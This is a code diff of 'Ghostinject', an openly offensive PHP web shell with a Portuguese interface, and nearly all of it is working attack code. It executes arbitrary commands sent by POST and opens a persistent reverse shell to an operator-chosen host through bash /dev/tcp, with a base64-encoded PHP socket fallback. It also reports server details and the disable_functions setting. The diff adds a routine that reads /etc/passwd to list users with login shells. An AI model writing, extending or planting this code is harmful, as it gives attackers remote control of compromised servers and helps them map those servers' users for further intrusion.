@@ -1,5 +1,5 @@
 <?php
-// Ghostinject - Linux PHP persistent reverse shell
+// Ghostinject - Linux PHP persistent reverse shell + user list
 error_reporting(0);
 
 // Command execution
@@ -19,13 +19,13 @@ if (isset($_POST['cmd'])) {
     exit;
 }
 
-// Persistent reverse shell (multi‑method, auto‑reconnect)
+// Persistent reverse shell (multi-method)
 if (isset($_POST['rev_host']) && isset($_POST['rev_port'])) {
     $host = $_POST['rev_host'];
     $port = (int)$_POST['rev_port'];
     $success = false;
 
-    // Method 1: Bash /dev/tcp with auto‑reconnect
+    // Bash /dev/tcp with auto-reconnect
     $bash_paths = ['/bin/bash', '/usr/bin/bash', '/bin/sh'];
     foreach ($bash_paths as $bash) {
         if (is_executable($bash)) {
@@ -36,7 +36,7 @@ if (isset($_POST['rev_host']) && isset($_POST['rev_port'])) {
         }
     }
 
-    // Method 2: PHP socket persistent fallback
+    // PHP socket fallback
     if (!$success && function_exists('fsockopen')) {
         $payload = base64_encode(
             'set_time_limit(0);$h="' . $host . '";$p=' . $port . ';while(1){' .
@@ -49,26 +49,54 @@ if (isset($_POST['rev_host']) && isset($_POST['rev_port'])) {
         $success = true;
     }
 
-    echo $success ? "Ghostinject: Persistent reverse shell started (auto‑reconnect). Keep listener open!" : "All methods failed.";
+    echo $success ? "Ghostinject: Persistent reverse shell started (auto-reconnect). Keep listener open!" : "All methods failed.";
     exit;
 }
 
-// System info (Linux)
+// Helper: get shell users from /etc/passwd
+function get_shell_users() {
+    $users = '';
+    if (@file_exists('/etc/passwd')) {
+        $lines = file('/etc/passwd');
+        foreach ($lines as $line) {
+            $parts = explode(':', $line);
+            if (count($parts) >= 7) {
+                $shell = trim($parts[6]);
+                if (in_array($shell, ['/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash', '/usr/bin/bash', '/usr/bin/zsh'])) {
+                    $users .= htmlspecialchars($parts[0]) . ' (' . $shell . ')<br>';
+                }
+            }
+        }
+    }
+    return $users ?: 'No shell users found or permission denied.';
+}
+
+// System info
 $os = php_uname() ?: 'Linux';
-$user = get_current_user() ?: (function_exists('exec') ? exec('whoami') : 'N/A');
+$user = function_exists('exec') ? @exec('whoami') : 'N/A';  // fixed: real process user
+if (!$user || $user == '') $user = get_current_user();
 $cwd = getcwd() ?: 'N/A';
 $phpver = phpversion();
 $serv = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
 $disabled = ini_get('disable_functions') ?: 'none';
+$shell_users = get_shell_users();
 ?>
 <!DOCTYPE html>
 <html>
-<head><title>Ghostinject | Linux PHP</title>
+<head><title>Ghostinject | Linux PHP (Persistent + Users)</title>
 <style>body{background:#0a0f0a;color:#0f0;font-family:monospace;padding:2em;} input,button{background:#222;color:#0f0;border:1px solid #0f0;} button{cursor:pointer;}</style>
 </head>
 <body>
-<h2>👻 Ghostinject - Linux PHP</h2>
-<ul><li>Sistema: <?=htmlspecialchars($os)?></li><li>Usuário: <?=htmlspecialchars($user)?></li><li>Diretório: <?=htmlspecialchars($cwd)?></li><li>PHP: <?=htmlspecialchars($phpver)?></li><li>Servidor: <?=htmlspecialchars($serv)?></li><li>disable_functions: <?=htmlspecialchars($disabled)?></li></ul>
+<h2>👻 Ghostinject - Linux PHP (Persistent Reverse Shell)</h2>
+<ul>
+<li>Sistema: <?=htmlspecialchars($os)?></li>
+<li>Usuário atual (www): <?=htmlspecialchars($user)?></li>
+<li>Diretório: <?=htmlspecialchars($cwd)?></li>
+<li>PHP: <?=htmlspecialchars($phpver)?></li>
+<li>Servidor: <?=htmlspecialchars($serv)?></li>
+<li>disable_functions: <?=htmlspecialchars($disabled)?></li>
+<li><strong>Usuários com shell (/bin/bash, /bin/sh, etc.) :</strong><br><?=$shell_users?></li>
+</ul>
 <h3>💻 Command</h3>
 <form method="post" id="cmdForm"><input type="text" name="cmd" size="70"><button type="submit">Run</button></form>
 <div id="cmdResult"></div>
